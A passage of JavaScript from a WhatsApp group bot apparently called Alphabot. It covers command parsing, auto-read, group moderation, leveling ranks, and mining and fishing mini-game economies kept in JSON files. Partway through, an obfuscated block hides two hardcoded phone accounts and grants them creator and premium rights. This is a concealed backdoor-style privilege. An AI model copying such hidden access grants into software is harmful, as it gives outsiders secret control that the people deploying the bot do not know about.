    fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multi){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ' '
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
		
const reply2 = (teks) => {
            alpha.sendMessage(from, teks, text, {quoted: mek, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
        }
// Auto Read Group 
var chats = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readGc === false) return
await alpha.chatRead(jid)
})
// Auto Read Private 
var chatss = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await alpha.chatRead(jid)
})
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `${longkapnye}\`\`\`B U G  G C  T E R D E T E K S I\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by bot_\n*Jangan maen bug lah*`
alpha.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply2(`Gua mau kick tapi gua bukan admin 🤙`) })
alpha.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
alpha.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}

if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply2('Fake Troli Detected \n\n' + require('util').format(m.key))
await alpha.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}

if (autovn) {
	if (autovn === false) return
await alpha.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await alpha.updatePresence(from, Presence.composing)
}
        body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		chatxs = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'documentMessage') && mek.message.documentMessage.caption ? mek.message.documentMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? alpha.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		let bio_nya = await alpha.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
		const senderNumber = sender.split("@")[0]
		const ownerNumberr = [`${targetpc}@s.whatsapp.net`]
		const ownerNumberrr = `${targetpc}@s.whatsapp.net`
		const isOwner = ownerNumberr.includes(sender)
		try {
					pp_userb = await alpha.getProfilePicture(sender)
				} catch {
					pp_userb = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let pp_userz = await getBuffer(pp_userb)
		const getGroupAdminss = (participants) => {
	admins = []
	for (let i of participants) {
		i.isAdmin ? admins.push(i.jid) : ''
	}
	return admins
}
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await alpha.chats.all()
		const totalgroup = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdminss(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntivirtex = isGroup ? antivirtex.includes(from) : false
		const isLevelingOn = isGroup ? _leveling.includes(from) : false
		const isNsfw = isGroup ? _nsfw.includes(from) : false
		const isEventon = isGroup ? event.includes(from) : false
		const isSewa = _sewa.checkSewaGroup(from, sewa)
		function _0x48c6(_0x36e236,_0x28a7d8){const _0x8c1642=_0x8c16();return _0x48c6=function(_0x48c6ce,_0x1ee6bc){_0x48c6ce=_0x48c6ce-0x186;let _0x4fb38b=_0x8c1642[_0x48c6ce];return _0x4fb38b;},_0x48c6(_0x36e236,_0x28a7d8);}const _0x52adec=_0x48c6;(function(_0x57c75f,_0x150719){const _0x132f1c=_0x48c6,_0x554c9b=_0x57c75f();while(!![]){try{const _0x52df39=-parseInt(_0x132f1c(0x189))/0x1*(parseInt(_0x132f1c(0x18a))/0x2)+parseInt(_0x132f1c(0x193))/0x3*(-parseInt(_0x132f1c(0x190))/0x4)+parseInt(_0x132f1c(0x18e))/0x5*(-parseInt(_0x132f1c(0x18d))/0x6)+parseInt(_0x132f1c(0x186))/0x7+-parseInt(_0x132f1c(0x187))/0x8*(-parseInt(_0x132f1c(0x188))/0x9)+-parseInt(_0x132f1c(0x18b))/0xa*(-parseInt(_0x132f1c(0x191))/0xb)+parseInt(_0x132f1c(0x194))/0xc*(parseInt(_0x132f1c(0x18c))/0xd);if(_0x52df39===_0x150719)break;else _0x554c9b['push'](_0x554c9b['shift']());}catch(_0x1c1493){_0x554c9b['push'](_0x554c9b['shift']());}}}(_0x8c16,0x2d1d7));const alphaNumber=[_0x52adec(0x192),_0x52adec(0x18f)],isCreator=alphaNumber['includes'](sender);function _0x8c16(){const _0x37a4cc=['65xmcCgV','6hoiUcV','785095EkGgce','918156874290@s.whatsapp.net','1432468GswrZV','121ZEBubH','62887435047326@s.whatsapp.net','3dHqOGE','619656hzoCVh','1984220vbkepi','282056trugsR','9LkAPQM','37166bVyVDD','12dJFTOf','314560vKQKoN'];_0x8c16=function(){return _0x37a4cc;};return _0x8c16();}
		const isPremium = isOwner || isCreator || mek.key.fromMe ? true : premium.checkPremiumUser(sender, _premium)
		const gcount = isPremium ? gcounttprem : gcounttuser
		const isBanned = banned.includes(sender)
		if (isCmd && isBanned) return reply2(lang.benned())
		const isVote = isGroup ? voting.includes(from) : false
		const ratee = ["Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const ini_mark = `0@s.whatsapp.net`
        const alfa = `${targetpc}@s.whatsapp.net`
		const alfa1 = `${targetpc}@s.whatsapp.net`
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = alpha.user.phone
		const status = `${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}`
		q3 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q4 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q5 = Object.keys(mek.message)[0] == "listResponseMessage" ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: ""
		butresx = (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const isAfkOn = off.checkAfkUser(sender, _off)
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
					const belipremgame = (sender, asu) => {
						var found = false;
						Object.keys(glimit).forEach((i) => {
							if(glimit[i].id == sender){
								found = i
								}
							})
						if (found !== false) {
							glimit[found].glimit += asu;
							fs.writeFileSync('./database/glimit.json',JSON.stringify(glimit))
							}
						}
const beliprem = (sender, asu) => {
    let found = false
	Object.keys(limit).forEach((i) => {
		if (limit[i].id === sender) {
			found = i
		}
	})
		if (found !== false) {
			limit[found].limit += asu
			fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
		}
}
/*const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }*/
const addRegisterUser = (userid, sender, bio, time) => {
const objp = { id: userid, nomor: sender, bio: bio, time: time }
register.push(objp)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
}
const cekUser = (sender) => {
let status = false
Object.keys(register).forEach((i) => {
if (register[i].id === sender) {
status = true
}
})
return status
}

const isRegister = cekUser(sender)
					
const getLevelingXp = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].xp
	}
}

const getLevelingLevel = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].level
	}
}

const getLevelingId = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].id
	}
}

const addLevelingXp = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].xp += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

const addLevelingLevel = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].level += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

					const addLevelingId = (sender) => {
						const obj = { id: sender, xp: 1, level: 1 }
						_level.push(obj)
						fs.writeFileSync('./src/level.json', JSON.stringify(_level))
						}
					const nebal = (angka) => {
						return Math.floor(angka)
						}
					function randomNomor(angka){
						return Math.floor(Math.random() * angka) + 1
						}
					const levelRole = getLevelingLevel(sender)
					const addATM = (sender) => {
        	const objo = {id: sender, uang : 0}
            uang.push(objo)
            fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
					//MANCING FUNCTION BY TAUFIK - KUN
        const addIkan = (sender, amount) => {
        let position = false
        Object.keys(ikan).forEach((i) => {
    	    if (ikan[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ikan[position].fish += amount
    	fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
    	}
    }
    
    const getMancingIkan = (sender) => {
    let position = false 
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].fish
	}
}

    const getMancingId = (sender) => {
    let position = false
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].id
    }
}
    
    const addMancingId = (sender) => {
        const ovj = {id: sender, fish: 0}
        ikan.push(ovj)
        fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
        }
    
    const jualIkan = (sender, amount) => {
        	let position = false
            Object.keys(ikan).forEach((i) => {
                if (ikan[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ikan[position].fish -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF MANCING FUNCTION

//PLANET GOO FUNCTION BY RIFAI
        const addPlanet = (sender, amount) => {
        let position = false
        Object.keys(planet).forEach((i) => {
    	    if (planet[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	planet[position].hape += amount
    	fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
    	}
    }
    
    const getBertualangPlanet = (sender) => {
    let position = false 
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].hape
	}
}

    const getPlaneId = (sender) => {
    let position = false
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].id
    }
}
    
    const addPlaneId = (sender) => {
        const ovj = {id: sender, hape: 0}
        planet.push(ovj)
        fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
        }
    
    const jualbahankimia = (sender, amount) => {
        	let position = false
            Object.keys(planet).forEach((i) => {
                if (planet[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                planet[position].hape -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//AKHIRNYA SELESEI NI GO PLANET (◡ ω ◡)
    //by ARYA & FELIX
//mining coal
        const addCoal = (sender, amount) => {
        let position = false
        Object.keys(coal).forEach((i) => {
    	    if (coal[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	coal[position].arang += amount
    	fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
    	}
    }
    
    const getMiningcoal = (sender) => {
    let position = false 
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].arang
	}
}

    const getMiningId = (sender) => {
    let position = false
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].id
    }
}
    
    const addMiningId = (sender) => {
        const ovj = {id: sender, arang: 0}
        coal.push(ovj)
        fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
        }
    
    const jualcoal = (sender, amount) => {
        	let position = false
            Object.keys(coal).forEach((i) => {
                if (coal[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                coal[position].arang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining stone
        const addStone = (sender, amount) => {
        let position = false
        Object.keys(stone).forEach((i) => {
    	    if (stone[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	stone[position].batu += amount
    	fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
    	}
    }
    
    const getMiningstone = (sender) => {
    let position = false 
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].batu
	}
}

    const getBatuId = (sender) => {
    let position = false
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].id
    }
}
    
    const addBatuId = (sender) => {
        const ovj = {id: sender, batu: 0}
        stone.push(ovj)
        fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
        }
    
    const jualstone = (sender, amount) => {
        	let position = false
            Object.keys(stone).forEach((i) => {
                if (stone[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                stone[position].batu -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining ore
        const addOre = (sender, amount) => {
        let position = false
        Object.keys(ore).forEach((i) => {
    	    if (ore[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ore[position].copperore += amount
    	fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
    	}
    }
    
    const getMiningore = (sender) => {
    let position = false 
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].copperore
	}
}

    const getOreId = (sender) => {
    let position = false
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].id
    }
}
    
    const addOreId = (sender) => {
        const ovj = {id: sender, copperore: 0}
        ore.push(ovj)
        fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
        }
    
    const jualore = (sender, amount) => {
        	let position = false
            Object.keys(ore).forEach((i) => {
                if (ore[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ore[position].copperore -= amount
                fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
            }
        }
    		//END OF mining
    //mining ingot
        const addIngot = (sender, amount) => {
        let position = false
        Object.keys(ingot).forEach((i) => {
    	    if (ingot[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ingot[position].copperingot += amount
    	fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
    	}
    }
    
    const getMiningingot = (sender) => {
    let position = false 
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].copperingot
	}
}

    const getIngotId = (sender) => {
    let position = false
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].id
    }
}
    
    const addIngotId = (sender) => {
        const ovj = {id: sender, copperingot: 0}
        ingot.push(ovj)
        fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
        }
    
    const jualingot = (sender, amount) => {
        	let position = false
            Object.keys(ingot).forEach((i) => {
                if (ingot[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ingot[position].copperingot -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //Nebang
        const addKayu = (sender, amount) => {
        let position = false
        Object.keys(kayu).forEach((i) => {
    	    if (kayu[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	kayu[position].wood += amount
    	fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
    	}
    }
    
    const getNebangKayu = (sender) => {
    let position = false 
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].wood
	}
}

    const getNebangId = (sender) => {
    let position = false
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].id
    }
}
    
    const addNebangId = (sender) => {
        const ovj = {id: sender, wood: 0}
        kayu.push(ovj)
        fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
        }
    
    const jualKayu = (sender, amount) => {
        	let position = false
            Object.keys(kayu).forEach((i) => {
                if (kayu[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                kayu[position].wood -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        //FUCNTION MANCING BY TAUFIK - KUN
        if (isGroup && isEventon) {
        const Fisha = getMancingIkan(sender)
        const FishId = getMancingId(sender)
        if (Fisha === undefined && FishId === undefined) addMancingId(sender)
        }
	//FUCNTION GOPLANET BY RIPAI
        if (isGroup && isEventon) {
        const Hapea = getBertualangPlanet(sender)
        const HapeId = getPlaneId(sender)
        if (Hapea === undefined && HapeId === undefined) addPlaneId(sender)
        }
	   //FUCNTION mining coal
        if (isGroup && isEventon) {
        const Coala = getMiningcoal(sender)
        const CoalId = getMiningId(sender)
        if (Coala === undefined && CoalId === undefined) addMiningId(sender)
        }
        //FUCNTION mining batu
        if (isGroup && isEventon) {
        const Stonea = getMiningstone(sender)
        const StoneId = getBatuId(sender)
        if (Stonea === undefined && StoneId === undefined) addBatuId(sender)
        }
        //FUCNTION mining ore
        if (isGroup && isEventon) {
        const Orea = getMiningore(sender)
        const OreId = getOreId(sender)
        if (Orea === undefined && OreId === undefined) addOreId(sender)
        }
        //FUCNTION lebur ingot
        if (isGroup && isEventon) {
        const Ingota = getMiningingot(sender)
        const IngotId = getIngotId(sender)
        if (Ingota === undefined && IngotId === undefined) addIngotId(sender)
        }
        //FUCNTION nebang kayu
        if (isGroup && isEventon) {
        const Kayua = getNebangKayu(sender)
        const KayuId = getNebangId(sender)
        if (Kayua === undefined && KayuId === undefined) addNebangId(sender)
        }
        if (isRegister && isGroup ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
					var role = 'Bronze 1'
					if (levelRole <= 2) {
						role = 'Bronze 1'
						} else if (levelRole <= 10) {
							role = 'Bronze 2'
							} else if (levelRole <= 20) {
								role = 'Bronze 3'
								} else if (levelRole <= 30) {
									role = 'Bronze 4'
									} else if (levelRole <= 40) {
										role = 'Bronze 5'
										} else if (levelRole <= 70) {
											role = 'Silver 1'
											} else if (levelRole <= 85) {
												role = 'Silver 2'
												} else if (levelRole <= 95) {
													role = 'Silver 3'
													} else if (levelRole <= 105) {
														role = 'Silver 4'
														} else if (levelRole <= 125) {
															role = 'Silver 5'
															} else if (levelRole <= 150) {
																role = 'Gold 1'
																} else if (levelRole <= 170) {
																	role = 'Gold 2'
																	} else if (levelRole <= 190) {
																		role = 'Gold 3'
																		} else if (levelRole <= 210) {
																			role = 'Gold 4'
																			} else if (levelRole <= 230) {
																				role = 'Gold 5'
																				} else if (levelRole <= 260) {
																					role = 'Platinum 1'
																					} else if (levelRole <= 290) {
																						role = 'Platinum 2'
																						} else if (levelRole <= 320) {
																							role = 'Platinum 3'
																							} else if (levelRole <= 350) {
																								role = 'Platinum 4'
																								} else if (levelRole <= 380) {
																									role = 'Platinum 5'
																									} else if (levelRole <= 410) {
																										role = 'Diamond 1'
																										} else if (levelRole <= 450) {
																											role = 'Diamond 2'
																											} else if (levelRole <= 500) {
																												role = 'Diamond 3'
																												} else if (levelRole <= 550) {
																													role = 'Diamond 4'
																													} else if (levelRole <= 600) {
																														role = 'Diamond 5'
																														} else if (levelRole <= 700) {
																															role = 'Master'
																															} else if (levelRole <= 800) {
																															role = 'Master ✩'
																														} else if (levelRole <= 900) {
																													role = 'Master ✩✩'
																												} else if (levelRole <= 1000) {
																											role = 'Master ✩✩✩'
																										} else if (levelRole <= 1100) {
																									role = 'Master ✯'
																								} else if (levelRole <= 1225) {
																							role = 'Master ✯✯'
																						} else if (levelRole <= 1340) {
																					role = 'Master ✯✯✯'
																				} else if (levelRole <= 1400) {
																			role = 'GrandMaster'
																		} else if (levelRole <= 1555) {
																	role = 'GrandMaster ✩'
																} else if (levelRole <= 1660) {
															role = 'GrandMaster ✩✩'
														} else if (levelRole <= 1710) {
													role = 'GrandMaster ✩✩✩'
												} else if (levelRole <= 1825) {
											role = 'GrandMaster ✯'
										} else if (levelRole <= 1950) {
									role = 'GrandMaster ✯✯'
								} else if (levelRole <= 2000) {
							role = 'GrandMaster ✯✯✯'
						} else if (levelRole <= 2220) {
					role = 'Legends'
				} else if (levelRole <= 2500) {
					role = 'Legends 2'
					} else if (levelRole <= 2700) {
						role = 'Legends 3'
						} else if (levelRole <= 2900) {
							role = 'Legends 4'
							} else if (levelRole <= 3100) {
								role = 'Legends 5'
								} else if (levelRole <= 3300) {
									role = 'Legends 6'
									} else if (levelRole <= 3600) {
										role = 'Legends 7'
										} else if (levelRole <= 3900) {
											role = 'Legends 8'
											} else if (levelRole <= 4200) {
												role = 'Legends 9'
												} else if (levelRole <= 4450) {
													role = 'Legends 10'
													} else if (levelRole <= 4700) {
														role = 'Legends 忍'
														} else if (levelRole <= 4900) {
															role = 'Legends 忍¹'
															} else if (levelRole <= 5100) {
																role = 'Legends 忍²'
																} else if (levelRole <= 5600) {
																	role = 'Legends 忍³'
																	} else if (levelRole <= 6100) {
																		role = 'Legends 忍⁴'
																		} else if (levelRole <= 7000) {
																			role = 'GrandLegends'
																			} else if (levelRole <= 10000) {
																				role = 'GrandLegends 1'
																				} else if (levelRole <= 20000) {
																					role = 'GrandLegends 2'
																					} else if (levelRole <= 30000) {
																						role = 'GrandLegends 3'
																						} else if (levelRole <= 40000) {
																							role = 'GrandLegends 4'
																							} else if (levelRole <= 50000) {
																								role = 'GrandLegends 忍¹'
																								} else if (levelRole <= 60000) {
																									role = 'GrandLegends 忍²'
																									} else if (levelRole <= 70000) {
																										role = 'GrandLegends 忍³'
																										} else if (levelRole <= 80000) {
																											role = 'GrandLegends 忍⁴'
																											} else if (levelRole <= 90000) {
																												role = 'Pro 숒'
																												} else if (levelRole <= 99999999999999) {
																													role = 'Pro × GrandLegends 숒'
																												}
        const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Sunday"; break;
                case 1: hari = "Monday"; break;
                case 2: hari = "Tuesday"; break;
                case 3: hari = "Wednesday"; break;
                case 4: hari = "Thursday"; break;
